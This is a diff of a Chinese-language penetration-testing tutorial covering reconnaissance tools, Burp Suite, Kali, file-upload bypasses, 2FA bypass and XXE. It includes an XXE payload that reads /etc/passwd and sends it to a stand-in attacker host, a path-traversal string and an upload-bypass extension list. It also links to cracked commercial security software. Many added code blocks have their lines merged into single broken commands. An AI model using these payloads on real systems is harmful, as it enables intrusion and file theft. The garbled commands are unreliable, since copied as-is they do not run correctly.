@@ -70,7 +70,7 @@
   - [监控](#监控)
   - [内部信息搜集](#内部信息搜集)
 - [工具](#工具-1)
-    - [虚拟机配置上网](#虚拟机配置上网)
+    - [虚拟机](#虚拟机)
   - [学会上网](#学会上网)
     - [学会用普通搜索引擎](#学会用普通搜索引擎)
     - [暗网](#暗网)
@@ -108,13 +108,13 @@
       - [Wireshark](#wireshark)
       - [Burpsuite](#burpsuite)
         - [使用前准备](#使用前准备)
-        - [有用资源](#有用资源)
     - [通用漏洞扫描工具](#通用漏洞扫描工具)
       - [Nessus](#nessus)
       - [网站扫描](#网站扫描)
     - [Cobaltstrike](#cobaltstrike)
     - [kali](#kali)
       - [安装kali](#安装kali)
+      - [扫描目标网站](#扫描目标网站)
   - [社会工程](#社会工程)
   - [后门](#后门)
     - [msfvenom](#msfvenom)
@@ -183,11 +183,9 @@
       - [防御与绕过方法](#防御与绕过方法)
         - [待补充：AI破解](#待补充ai破解)
         - [绕过双因素验证](#绕过双因素验证)
-  - [CRLF 注入](#crlf-注入)
-  - [宽字节注入](#宽字节注入)
-  - [待整理：XXE](#待整理xxe)
-    - [学习资料](#学习资料)
+  - [XXE](#xxe)
     - [XXE 攻击](#xxe-攻击)
+      - [奇淫技巧](#奇淫技巧)
       - [自动攻击工具](#自动攻击工具)
       - [手动攻击](#手动攻击)
       - [payload](#payload)
@@ -243,11 +241,11 @@
       - [xss平台](#xss平台)
       - [beef-xss](#beef-xss)
     - [防御与绕过](#防御与绕过)
-      - [httponly](#httponly)
-      - [绕过方案](#绕过方案)
+      - [防御](#防御-4)
+      - [绕过过滤](#绕过过滤)
   - [CSRF](#csrf)
     - [实战](#实战)
-    - [防御](#防御-4)
+    - [防御](#防御-5)
   - [待补充：模板注入](#待补充模板注入)
   - [SSRF](#ssrf)
     - [常见攻击](#常见攻击)
@@ -258,6 +256,9 @@
     - [DNS劫持](#dns劫持)
     - [HTTP劫持](#http劫持)
     - [DLL劫持](#dll劫持)
+  - [攻击漏洞技巧](#攻击漏洞技巧)
+    - [CRLF 注入](#crlf-注入)
+    - [宽字节注入](#宽字节注入)
 - [绕过检测](#绕过检测)
   - [待补充：免杀](#待补充免杀)
   - [WAF绕过](#waf绕过)
@@ -282,6 +283,22 @@
     - [权限控制拦截](#权限控制拦截)
     - [其他绕过总结](#其他绕过总结)
 - [经验积累](#经验积累)
+  - [漏洞出现在？](#漏洞出现在)
+    - [URL参数](#url参数)
+      - [经验](#经验-1)
+      - [出现在：参数可渲染](#出现在参数可渲染)
+      - [+http参数污染](#http参数污染)
+      - [+CRLF](#crlf)
+      - [+xss](#xss)
+      - [+开放重定向](#开放重定向)
+    - [嵌入网站元素](#嵌入网站元素)
+      - [+xss](#xss-1)
+    - [数据包参数](#数据包参数)
+      - [置空](#置空)
+      - [修改信号](#修改信号)
+    - [重复发包](#重复发包)
+    - [文件上传](#文件上传)
+      - [+xxe](#xxe-1)
   - [中间件](#中间件-1)
     - [IIS](#iis)
     - [Apache](#apache)
@@ -302,7 +319,6 @@
     - [PHP](#php)
       - [变量覆盖漏洞](#变量覆盖漏洞)
     - [JAVAWEB](#javaweb)
-      - [与SQL注入有关的预编译](#与sql注入有关的预编译)
       - [JSON WEB TOKEN](#json-web-token)
         - [破解](#破解-1)
   - [蜜罐](#蜜罐)
@@ -339,13 +355,15 @@
     - [工具](#工具-6)
       - [gophish](#gophish)
     - [钓鱼手段](#钓鱼手段)
+      - [链接存放在](#链接存放在)
+        - [+开放重定向](#开放重定向-1)
       - [宏 – Office](#宏--office)
       - [非宏的 Office 文件 —— DDE](#非宏的-office-文件--dde)
       - [隐藏的加密 payload](#隐藏的加密-payload)
       - [钓鱼 wifi](#钓鱼-wifi)
     - [定向社工](#定向社工)
   - [如何在本地查询](#如何在本地查询)
-- [经验](#经验-1)
+- [经验](#经验-2)
   - [知名网站](#知名网站)
   - [IP伪造](#ip伪造)
     - [攻破类似网站](#攻破类似网站)
@@ -400,7 +418,8 @@
   - [提权](#提权)
     - [提权准备](#提权准备)
     - [window提权](#window提权)
-      - [提权准备](#提权准备-1)
+      - [提权方法](#提权方法)
+        - [系统内核溢出漏洞提权](#系统内核溢出漏洞提权)
       - [win2003](#win2003)
       - [win7](#win7)
       - [win2008](#win2008)
@@ -414,7 +433,7 @@
         - [提权原理](#提权原理)
         - [提权过程](#提权过程)
     - [LINUX提权](#linux提权)
-      - [提权准备](#提权准备-2)
+      - [提权准备](#提权准备-1)
       - [SUID配置错误漏洞](#suid配置错误漏洞)
       - [压缩通配符](#压缩通配符)
       - [定时任务执行权限分配过高](#定时任务执行权限分配过高)
@@ -437,8 +456,20 @@
     - [数据库监控](#数据库监控)
     - [常规代码审计](#常规代码审计)
   - [JAVAWEB](#javaweb-1)
+    - [开发基础](#开发基础)
+      - [Spring](#spring)
+        - [基础介绍](#基础介绍)
+        - [核心知识点](#核心知识点)
+      - [Spring MVC](#spring-mvc)
+      - [MyBatis](#mybatis)
+    - [开发基础](#开发基础-1)
     - [基础开发知识](#基础开发知识)
     - [审计](#审计)
+        - [常见审计知识点](#常见审计知识点)
+        - [寻找可控输入](#寻找可控输入)
+        - [过滤敏感字符方案](#过滤敏感字符方案)
+      - [SQL注入](#sql注入-1)
+        - [防御](#防御-6)
       - [手动](#手动-1)
       - [工具](#工具-7)
 - [待补充：物理攻击](#待补充物理攻击)
@@ -451,7 +482,7 @@
 
 **作者：北丐**
 
-**qq交流群：942443861，（8.15后）会在群里发放渗透资料**
+**qq交流群：942443861**
 
 文章链接：https://github.com/ngadminq/Bei-Gai-penetration-test-guide
 
@@ -460,7 +491,7 @@
 预计2022年完成
 
 
-很抱歉，这篇文章你看到的时候还是粗糙的，文章更改可能出现在各个章节，文章**约一周发布2次左右更新版本。**
+很抱歉，这篇文章你看到的时候还是粗糙的，文章更改可能出现在各个章节，文章**每周五更一次版本。**
 在github显示与排版效果似乎不好，可以下载[typora](https://typora.io/)与md文件，将md用typora打开，可以看到目录树。如下图是软件打开效果。
 ![在这里插入图片描述](https://img-blog.csdnimg.cn/20210720144245627.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
 哈哈哈，对了发现一个问题，因为文章文本含有不少漏洞后门代码，这可能导致你的查杀软件当做异常。不过不用担心我是不是有恶意，因为我不会伤害我的任何一位读者。善用crtl+F，对关键字进行快速定位。学习时可自行按照自己喜欢的顺序，并不一定要严格按照我的文章目录。
@@ -468,6 +499,7 @@
 
 
 我热爱分享，文章可能有的部分对于你有帮助有的没有，选来用。请善待我的努力和分享精神。如果你觉得文章对你有帮助记得star，或者在你的技术分享文章中引用我的文章链接
+
 # 常见知识点
 
 只介绍常见和必备基础不涉及到深度，并且里面穿插一些与安全相关的知识点
@@ -1005,7 +1037,7 @@ apache,iis,tomcat,nginx
 
 ### 源码层面收集
 
-通研究源代码，能够发现一些敏感目录。
+通研究源代码，能够发现一些敏感目录，你可以通过右键点击查看到受渲染后的源码(不详细)，也可以点击F12后查看source/XX.js(有时候等同于你在做白盒测试了)
 
 查看header:contype
 文件命名规则
@@ -1015,6 +1047,7 @@ apache,iis,tomcat,nginx
 github除了很可能存在源码以外，也会记录下作者提交的删除的历史记录。这些历史记录可能保留着重要的如密码等敏感数据
 
 **Truffle Hog**工具会扫描不同的提交历史记录和分支来获取高机密的密钥，并输出它们。这对于查找机密数据、密码、密钥等非常有用。
+
 ```bash
 cd /opt/trufflehog/truffleHog
 python truffleHog.py https://github.com/cyberspacekittens/dnscat2
@@ -1359,16 +1392,18 @@ xray的rad爬虫 https://github.com/chaitin/rad
 ## 特殊信息
 
 ### 公司资产
+
 > 需要搞清楚公司拥有什么
 
 
 **1.  全貌**
+
 >已知企业名、老板名字 
 >
-你可以通过访问以下链接获取公司全貌，你可以很轻松的直接获得企业的分公司，全资子公司，网站域名、app,微信小程序，企业专利品牌信息，企业邮箱，电话等等
-爱企查，免费，但不够全面[https://aiqicha.baidu.com/?from=pz](https://aiqicha.baidu.com/?from=pz)
-微信小程序：企信通，付费，但网上有办法破解比爱企查更新更及时可以结合使用
-百度百科
+>你可以通过访问以下链接获取公司全貌，你可以很轻松的直接获得企业的分公司，全资子公司，网站域名、app,微信小程序，企业专利品牌信息，企业邮箱，电话等等
+>爱企查，免费，但不够全面[https://aiqicha.baidu.com/?from=pz](https://aiqicha.baidu.com/?from=pz)
+>微信小程序：企信通，付费，但网上有办法破解比爱企查更新更及时可以结合使用
+>百度百科
 
 **收购**
 从爱企查、企信通、百度百科获得
@@ -1385,6 +1420,7 @@ http://ipv4info.com/
 查询域名注册邮箱
 通过备案号查询域名
 **反查获取更多信息**
+
 >反查是你在获得部分信息的情况下，希望获得更多信息
 
 反查whois
@@ -1515,12 +1551,13 @@ https://crt.sh/（SSL证书查询）
 ![在这里插入图片描述](https://img-blog.csdnimg.cn/20210620185251394.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
 
 ##### 方法四：图标发现子域名
+
 您是否知道我们可以通过查找相同的图标图标哈希来找到与目标相关的域和子域?具体使用https://github.com/m4ll0k/BBTz/blob/master/favihash.py
 
 ```bash
-cat my_targets.txt | xargs -I %% bash -c 'echo "http://%%/favicon.ico"' > targets.txt
-python3 favihash.py -f https://target/favicon.ico -t targets.txt -s
+cat my_targets.txt | xargs -I %% bash -c 'echo "http://%%/favicon.ico"' > targets.txtpython3 favihash.py -f https://target/favicon.ico -t targets.txt -s
 ```
+
 ![在这里插入图片描述](https://img-blog.csdnimg.cn/2c288bc18a2143baa52d4d9e278d738b.png)
 简单地说,favihash 将允许我们发现与我们的目标具有相同 favicon 图标哈希的域。
 **端口扫描**
@@ -1530,19 +1567,19 @@ python3 favihash.py -f https://target/favicon.ico -t targets.txt -s
 
 
 ##### 方法五：搜索引擎子域名
+
 空间搜索引擎，利用百度谷歌使用site等
+
 ##### 方法六：DNS发现子域名
+
 使用此工具来找到他的子域https://rapiddns.io/
 
 ```bash
-rapiddns(){
-curl -s "https://rapiddns.io/subdomain/$1?full=1" \
- | grep -oP '_blank">\K[^<]*' \
- | grep -v http \
- | sort -u
-}
+rapiddns(){curl -s "https://rapiddns.io/subdomain/$1?full=1" \ | grep -oP '_blank">\K[^<]*' \ | grep -v http \ | sort -u}
 ```
+
 ##### 方法七：其他方法发现子域名
+
 一些常用的工具有以下
 [assetfinder](https://github.com/tomnomnom/assetfinder)
 是用来查找资产的子域的
@@ -1558,6 +1595,7 @@ https://github.com/lc/gau
 发现废弃网站使用的子域
 https://github.com/nsonaniya2010/SubDomainizer
 https://github.com/Cillian-Collins/subscraper
+
 #### 目录爆破
 
 扫描敏感文件
@@ -1611,7 +1649,6 @@ kali自带ka的一款工具，fuzz很方便。kali中直接在命令行中输入
 
 ```bash
 filename=../../../etc/passwd
-
 ```
 
 成功
@@ -1636,6 +1673,7 @@ filename=../../../etc/passwd
 简单来说就是不同服务器上的不同站点，网站搭建用不同的服务器搭建不同的站点，但都属于同一个站点，我们可以攻击其中一个网站，通过内网渗透从而获取其他网站的权限。
 
 在线C段查询：https://chapangzhan.com/
+
 ## 钓鱼
 
 ## 监控
@@ -1643,6 +1681,7 @@ filename=../../../etc/passwd
 监控是否有新的端口开放nmap_diff
 
 应用程序是否发生改变
+
 ## 内部信息搜集
 
 
@@ -1651,9 +1690,12 @@ filename=../../../etc/passwd
 工具这一部分除了参考我简介的基本规则，你最需要的是上手练习以及理解这些工具是做了什么事，尤其是在不知道为什么报错时。练习无话可说，别贪全能上手就行。理解工具可以用进程抓包工具，比如WSExplorer或火绒剑看软件发了什么请求。
 另外这部分内容我会尽可能稀释，将会尽可能实用、精简的介绍工具。不然你阅读可能会感到乏味，部分工具的使用我会移入后续章节![在这里插入图片描述](https://img-blog.csdnimg.cn/20210716002538181.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
 
-### 虚拟机配置上网
+### 虚拟机
 
-桥接（Bridged）：VMnet0连接，类似与一个网络环境下的两台电脑
+很多人都使用的是VMware Workstation Pro
+**配置上网**
+
+桥接（Bridged）：VMnet0连接，类似与一个网络环境下的两台电脑。如果主机开了DHCP则虚拟机可以自动获取ip，如果是在局域网没有获得DHCP的设备，就需要手动配置IP，将IP配置到同一网段内
 
  网络地址转化（Network Address Translation）：Vmnet8连接，类似孕妇，虚拟机通过主机上网
 
@@ -2010,11 +2052,7 @@ Swaks是由John Jetmore编写和维护的一种功能强大，灵活，可脚本
 使用细节
 
 ```bash
-    To:收件人
-    From:发件人
-    Subject:主题
-    Date:日期
-    Subject:标题
+    To:收件人    From:发件人    Subject:主题    Date:日期    Subject:标题
 ```
 
 通常怎么使用
@@ -2027,6 +2065,7 @@ swaks --body "内容" --header "Subject:标题" -t xxxxx@qq.com -f "admin@local.
 
 
 #### 发现电子邮件
+
 https://github.com/laramies/theHarvester (100% 免费)
 https://phonebook.cz/ (100%免费)
 https://maildb.io/
@@ -2052,11 +2091,7 @@ Sparta主要包含以下功能：
 第一次在kali 中使用 需要先下载文件 
 
 ```bash
-#这是我克隆到码云的，会加快国内下载速度。如果你不信任这个链接，请将链接改成  https://github.com/SECFORCE/sparta.git
-git clone https://gitee.com/ngadminq/sparta.git
-
-#切换到sparta文件夹，检索到sparta.py文件，利用python环境进行运行
-python3 sparta.py
+#这是我克隆到码云的，会加快国内下载速度。如果你不信任这个链接，请将链接改成  https://github.com/SECFORCE/sparta.gitgit clone https://gitee.com/ngadminq/sparta.git#切换到sparta文件夹，检索到sparta.py文件，利用python环境进行运行python3 sparta.py
 ```
 
 ![在这里插入图片描述](https://img-blog.csdnimg.cn/20210609161602160.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
@@ -2082,24 +2117,25 @@ python3 sparta.py
 ```bash
 nmap -sT www.baidu.com
 ```
+
 Open port: SYN --> SYN/ACK --> RST
 Closed port: SYN --> RST/ACK
 Filtered port: SYN --> [NO RESPONSE]
 Filtered port: SYN ->ICMP消息
+
 ****
+
 半扫描
 SYN/ACK，相对隐蔽点
 
 ```bash
-nmap -sS www.baidu.com
-nmap -sA www.baidu.com
+nmap -sS www.baidu.comnmap -sA www.baidu.com
 ```
 
 其他扫描
 
 ```bash
-# ICMP
-nmap -sP www.baidu.com
+# ICMPnmap -sP www.baidu.com
 ```
 
 
@@ -2108,24 +2144,13 @@ nmap -sP www.baidu.com
 有些参数耗时将很长，显示文档将太过全面。所以读者可以适当调整
 
 ```bash
-nmap -A -v -sA -T0 --osscan-guess -p- -P0 --script=vuln 
---spoof-mac 09:22:71:11:15:E2 --version-intensity 9
- –D decoy1,decoy2,decoy3,target -oX log.xml
+nmap -A -v -sA -T0 --osscan-guess -p- -P0 --script=vuln --spoof-mac 09:22:71:11:15:E2 --version-intensity 9 –D decoy1,decoy2,decoy3,target -oX log.xml
 ```
 
 **常用命令**
 
 ```bash
-nmap -A www.baidu.com
-## Nmap fast scan for the most 1000tcp ports used
-nmap -sV -sC -O -T4 -n -Pn -oA fastscan <IP> 
-## Nmap fast scan for all the ports
-nmap -sV -sC -O -T4 -n -Pn -p- -oA fullfastscan <IP> 
-## Nmap fast scan for all the ports slower to avoid failures due to -T4
-nmap -sV -sC -O -p- -n -Pn -oA fullscan <IP>
-
-#Bettercap2 Scan
-syn.scan 192.168.1.0/24 1 10000 #Ports 1-10000
+nmap -A www.baidu.com## Nmap fast scan for the most 1000tcp ports usednmap -sV -sC -O -T4 -n -Pn -oA fastscan <IP> ## Nmap fast scan for all the portsnmap -sV -sC -O -T4 -n -Pn -p- -oA fullfastscan <IP> ## Nmap fast scan for all the ports slower to avoid failures due to -T4nmap -sV -sC -O -p- -n -Pn -oA fullscan <IP>#Bettercap2 Scansyn.scan 192.168.1.0/24 1 10000 #Ports 1-10000
 ```
 
 
@@ -2156,27 +2181,26 @@ Wireshark是绝对经典的，最著名的网络分析仪和密码破解工具�
 Wireshark官方下载链接： https://www.wireshark.org/download.htmlZ
 
 #### Burpsuite
-##### 使用前准备
-2021/8已有Burp8破解版，主要区别是能识别http2（相较于http1支持一个ip并发访问）漏洞。
-安装方法：
-1.[win10 一键安装java环境](http://aka.ms/vscode-java-installer-win)。如果java版本过旧需要[一键卸载](https://java.com/zh-CN/download/)。
-2. 下载破解包下载链接为https://pan.baidu.com/s/1gayYGXw-a_BZa9SFnyXi8g 提取码: m24h 
-3. 在官网下载专业版，专业版需要输入企业邮箱（可瞎写不会验证的）
-****
 
-##### 有用资源
-[官方burpsuite十大流行工具](https://portswigger.net/solutions/penetration-testing/penetration-testing-tools)
+看看详细文档粗略了解一下bp作用
 [官方burpsuite教程](https://portswigger.net/support/the-burp-methodology)
 [burpsuite 非官方中文教程](https://t0data.gitbooks.io/burpsuite/content/)
+
+##### 使用前准备
+
+2021/8已有Burp8破解版，主要区别是能识别http2（相较于http1支持一个ip并发访问）漏洞，界面上也更加好用美观还内嵌浏览器录屏等。网上有免破解版
+
+bp使用通常会装上很多可行的插件，[手动安装方法可参见，值得注意一点手动安装的目录必须是英文名，中文名会报类似于java.class/lang等错误](https://blog.csdn.net/qq_57868287/article/details/118121428)。安装插件可参见，[官方burpsuite十大流行工具](https://portswigger.net/solutions/penetration-testing/penetration-testing-tools)
+我使用的burpsuite插件：
+
+ - Autorize 强大的越权自动化测试工具
+ - Software Vulnerability Scanner 自动根据版本号查找 CVE
 
 **详细待补充burpsuite安装、功能模块、网页代理设置**
 数据联动
 Burp Intruder也可以通过字典攻击来实施强制浏览(通常是在url参数和文件路径部分进行修改)，爆破、注入等。
 
-
 burpsuite当抓不到包时，可能是目标网站是个无发送数据包的网站，比如只有一些静态的js代码，你的交互都是在目标主机本机运行，因此就不会展示数据包。比如你也许认为上传操作都可以抓到数据包，然而事实上是有的数据包是js操作，所以根本就不会反馈数据包给你
-
-
 
 
 hex是网站raw的二进制,在进行00截断时很有用。
@@ -2223,10 +2247,14 @@ compare用于对比两次数据的差异，比如枚举用户名，查看返回�
 Intruder是一个高度可配置工具，可以对web自动化攻击，模糊测试，sql注入，目录遍历等
 
 ### 通用漏洞扫描工具
+
 nessus、openvas、xray、AWVS、NetSparker等
+
 #### Nessus 
+
 Nessus 是目前全世界最多人使用的系统漏洞扫描与分析软件。总共有超过75,000个机构使用 Nessus 作为扫描该机构电脑系统的软件。
 如何破解[http://www.luckyzmj.cn/posts/477c90d0.html#toc-heading-1](http://www.luckyzmj.cn/posts/477c90d0.html#toc-heading-1)
+
 #### 网站扫描
 
 AWVS较为轻量，扫描快。APPscan大但全，一般为发现网站漏洞会结合使用
@@ -2248,16 +2276,9 @@ awvs_13.0.2009 web漏洞扫描器 安装教程,附下载破解包下载链接，
 ### kali
 
 kali有600+渗透工具。
-
-
-
 ![在这里插入图片描述](https://img-blog.csdnimg.cn/20210510222251130.png)
 
 https://blog.csdn.net/jayjaydream/article/details/82945384
-
-
-
-
 #### 安装kali
 
 很多黑客教学都是首先教你装一个虚拟机，再将kali系统装在虚拟机上。如果你用这样方式去攻击外网服务器，那么你可能需要使用到端口转化/端口映射。
@@ -2268,16 +2289,27 @@ Kali安装到u盘加密、持久化    https://www.freebuf.com/sectool/271770.ht
 然后一步步跟随以下命令就可以安装成功。具体可以参考博客 https://blog.csdn.net/sc_Pease/article/details/107243610
 
 ```bash
-yum install docker
-systemctl start docker
-systemctl status docker
-docker pull registry.cn-hangzhou.aliyuncs.com/fordo/kali:latest
-docker run -i -t 53e9507d8515 /bin/bash
+yum install dockersystemctl start dockersystemctl status dockerdocker pull registry.cn-hangzhou.aliyuncs.com/fordo/kali:latestdocker run -i -t 53e9507d8515 /bin/bash
 ```
 
 安装成功后，进入kali系统后，输入nmap，打印如下：
 ![在这里插入图片描述](https://img-blog.csdnimg.cn/20210616170405781.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
 
+#### 扫描目标网站
+通常来讲一个网站有子域名，而对于主站的扫描通常不能指望一下能发现敏感信息
+**Nikto**是一个开源的WEB扫描评估软件，可以对Web服务器进行多项安全测试，能在230多种服务器上扫描出 2600多种有潜在危险的文件、CGI及其他问题。Nikto可以扫描指定主机的WEB类型、主机名、指定目录、特定CGI漏洞、返回主机允许的 http模式等。
+```bash
+# 扫描ip端口并输出报告
+nikto -host URL/IP -port 80 -o res.html
+```
+扫描映射web信息
+cewl www.xxx.com
+
+扫描网站服务器信息（对http协议可用）
+whatweb www.xxx.com
+
+根据上面扫描的IP地址进行漏洞扫描，扫描开放的端口
+nmap xxx.xxx.xxx.xxx -v
 
 
 
@@ -2383,6 +2415,7 @@ cx security
 securitytracker
 
 ### 寻找EXP
+
 **搜索引擎**
 用搜索引擎搜索格式为：服务+版本+漏洞。比如织梦2.01漏洞
 或用shodan使用https://exploits.shodan.io/
@@ -2390,6 +2423,7 @@ securitytracker
 0day.today － 世界最大的漏洞利用数据库公开了大量EXP工具，网站地址：https://cn.0day.today/
 
 exploit.db
+
 > 官方推特：@ExploitDB
 > searchsploit是一个离线Exploit-DB的命令行搜索工具
 
@@ -2400,16 +2434,9 @@ https://sploitus.com/
 https://packetstormsecurity.com/
 **searchsploit**
 使用
+
 ```bash
-# 常用命令
-searchsploit 搜索关键词  --exclude="不包含关键词"
-#Searchsploit tricks
-searchsploit "linux Kernel" #Example
-searchsploit apache mod_ssl #Other example
-searchsploit -m 7618 #Paste the exploit in current directory
-searchsploit -p 7618[.c] #Show complete path
-searchsploit -x 7618[.c] #Open vi to inspect the exploit
-searchsploit --nmap file.xml #Search vulns inside an nmap xml result
+# 常用命令searchsploit 搜索关键词  --exclude="不包含关键词"#Searchsploit trickssearchsploit "linux Kernel" #Examplesearchsploit apache mod_ssl #Other examplesearchsploit -m 7618 #Paste the exploit in current directorysearchsploit -p 7618[.c] #Show complete pathsearchsploit -x 7618[.c] #Open vi to inspect the exploitsearchsploit --nmap file.xml #Search vulns inside an nmap xml result
 ```
 
 
@@ -2460,8 +2487,7 @@ PHP对象字符串后打印结果的意义，注意对int和string的输出是�
 **php序列化与反序列化相关函数**
 
 ```bash
-对象转换为字符串/字符串转换为对象
-serialize()/unserialize()
+对象转换为字符串/字符串转换为对象serialize()/unserialize()
 ```
 
 unserialize（）在执行时如果传入的是非空，会调用苏醒函数__wakeup()
@@ -2502,6 +2528,7 @@ ysoserial 工具会帮助你实现序列化，然后对方程序再调用反序�
 
 
 ### 常见反序列化爆出漏洞
+
 以下来自 https://blog.csdn.net/qq_36119192/article/details/90411169的总结
 shiro反序列化：Shiro反序列化漏洞复现
 weblogic反序列化：Weblogic相关漏洞
@@ -2550,12 +2577,7 @@ apache solr反序列化：
 文件包含的写法
 
 ```bash
-<!--#include file="1.asp" -->
-<!--#include file="top.aspx" -->
-<c:import url="http://thief.one/1.jsp">
-<jsp:include page="head.jsp"/>
-<%@ include file="head.jsp"%>
-<?php Include('test.php')?>
+<!--#include file="1.asp" --><!--#include file="top.aspx" --><c:import url="http://thief.one/1.jsp"><jsp:include page="head.jsp"/><%@ include file="head.jsp"%><?php Include('test.php')?>
 ```
 
 #### 本地文件包含
@@ -2735,22 +2757,7 @@ Windows不允许空格和点以及一些特殊字符作为结尾，创建这样�
 以下字典是我根据本文的方法进行的初步总结，但这样的字典明显太小，你需要用网上公开的fuzz字典，推荐一个 https://github.com/c0ny1/upload-fuzz-dic-builder
 
 ```bash
-.
- 
-::$$DATA
-.php3
-.php5
-. .
-.pphphp
-%00.jpg
-.PHp3
-%00.jpg
-/.jpg
-;.jpg
-.xxx
-;.php
-.p\nh\np
-
+. ::$$DATA.php3.php5. ..pphphp%00.jpg.PHp3%00.jpg/.jpg;.jpg.xxx;.php.p\nh\np
 ```
 
 ![在这里插入图片描述](https://img-blog.csdnimg.cn/20210709192845136.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
@@ -2786,7 +2793,7 @@ unlink，delfile是php中对应删除的函数
 常见漏洞：文件上传绕过检测、购买物品余额查询绕过检测
 
 #### 越权
-
+越权测试可以使用burpsuite的Autoz插件，在测试越权通常需要你建立两套不同的账户
 用户的授权过程是先检测账户名和密码或session等是不是对应得上，对应得上在根据用户的组给予相应权限。这里如果权限控制未设置准确就存在越权漏洞。
 
 ![在这里插入图片描述](https://img-blog.csdnimg.cn/77b3ef05d85b474ca1fab1b21f2df6d7.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
@@ -3005,8 +3012,9 @@ https://github.com/O365/python-o365
 ##### 待补充：AI破解
 
 ##### 绕过双因素验证
-
-双因素验证绕过是很困难的通常要结合钓鱼来绕过。钓鱼即通过伪造页面截取用户的请求，用模拟软件来将用户的请求反馈到真实网站中，进而完成登录
+双因素验证是个机巧的系统，难以正确实现。当你注意到站点使用了它时，你需要完整
+测试所有功能，包括 Token 的生命周期（如果站点管理员没有实现速率限制，就依靠于爆破），尝试的最大次数，复用过期的 Token，猜测Token 的可能性，以及其他。
+你也可以结合钓鱼来绕过。钓鱼即通过伪造页面截取用户的请求，用模拟软件来将用户的请求反馈到真实网站中，进而完成登录
 ReelPhish，https://github.com/fireeye/ReelPhish
 还有一些其他工具可以处理不同的双因素验证绕过的情境：
 
@@ -3016,54 +3024,53 @@ https://github.com/ustayready/CredSniper
 
 
 
-## CRLF 注入
-
-**简介**
-难度：低
-
-通常用在：分享链接
-拓展思路：对客户端的攻击，比如投票、跳转、关注等；
-绕过安全防护软件；
-
-
-**实战**
-
-测试链接：
-
-会话固定、XSS、缓存病毒攻击、日志伪造
-
-## 宽字节注入
-
-只要发现使用gbk，韩文、日文等编码时就可以考虑可能存在宽字节注入漏洞。
-
-在%df遇到%5c时，由于%df的ascii大于128，所以会自动拼接%5c，吃掉反斜线。而%27 %20小于ascii(128)的字符就会保留。通常都会用反斜线来转义恶意字符串，但是如果被吃掉后，转义失败，恶意的xss代码可以继续运行。
-反斜杠的GBxxx编码为%5C，根据GBxxx编码在前面加上%DE，%DF，%E0。。。都可以组成一个汉字，从而把反斜杠这个转义字符给吃了
-%27---------单引号
-
-%20----------空格
-
-%23-----------#号
-
-%5c------------/反斜杠
-
-php中有一个转义字符
 
 
 
-## 待整理：XXE
 
-![在这里插入图片描述](https://img-blog.csdnimg.cn/20210714132151577.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
+## XXE
 
+XML 指可扩展标记语言（EXtensible Markup Language），它是用于存储和传输数据的最常用的语言
 
-XML 指可扩展标记语言（EXtensible Markup Language），它是用于存储和传输数据的最常用的语言。和HTML很像，但区别是HTML与数据表示有关，XML与数据内容有关，你可以想想在爬虫中是重视XML格式，因为里面有挺多有价值的数据。XML是一种自我描述语言。它不包含任何预定义的标签，如 <p>、<img> 等。所有标签都是用户定义的，具体取决于它所代表的数据。<email></email>、<message></message> 等
-XXE漏洞全称XML External Entity Injection 即xml外部实体注入漏洞，XXE漏洞发生在应用程序解析XML输入时，没有禁止外部实体的加载，导致可加载恶意外部文件和代码，
-具体来说是XML的DTD会定义实体部分，实体部分对于XML就像是变量，但他不仅是变量，还可以用来调用本地文件1.txt或外部实体https://baidu.com。正因为这里实体有这么强大的功能，因此也容易被攻击。常见的攻击有任意文件读取、命令执行、内网端口扫描、攻击内网网站、发起Dos攻击等危害。
+**与HTML区别**
+它是用来对HTML的补充，HTML只能定义数据的展示，而XML能定义数据的组织。XML是一种自我描述语言。
+它不包含任何预定义的标签，如 <p>、<img> 等。所有标签都是用户定义的，具体取决于它所代表的数据。<email></email>、<message></message> 等
 
-### 学习资料
+**XXE漏洞**
+XXE漏洞全称XML External Entity Injection 即xml外部实体注入漏洞，XXE漏洞发生在应用程序解析XML输入时，**没有禁止外部实体的加载，如果禁止了就是合规的xml文件**，导致可加载恶意外部文件和代码，具体来说是XML的DTD会定义实体部分，实体部分对于XML就像是变量，**但他不仅是变量，还可以用来调用本地文件1.txt或外部实体https://baidu.com**。正因为这里实体有这么强大的功能，因此也容易被攻击。常见的攻击有任意文件读取、命令执行、内网端口扫描、攻击内网网站、发起Dos攻击等危害。
+```bash
+# 读取服务器密码
+## 情况1：有回显
+<?xml version="1.0" encoding="ISO-8859-1"?>
+<!DOCTYPE foo [
+<!ELEMENT foo ANY >
+<!ENTITY xxe SYSTEM "file:///etc/passwd" >
+]>
+<foo>&xxe;</foo>
 
-[【FreeBuf字幕组】WEB安全漏洞介绍-XML外部实体注入攻击（XXE）](https://www.bilibili.com/video/BV1at41177SA/)
+## 情况2：无回显（+远程）
+<?xml version="1.0" encoding="ISO-8859-1"?>
+<!DOCTYPE foo [
+<!ELEMENT foo ANY >
+<!ENTITY % xxe SYSTEM "file:///etc/passwd" >
+#将文件内容作为参数发送到黑客服务器
+<!ENTITY callhome SYSTEM "www.malicious.com/?%xxe;">
+]>
+<foo>&callhome;</foo>
+```
 
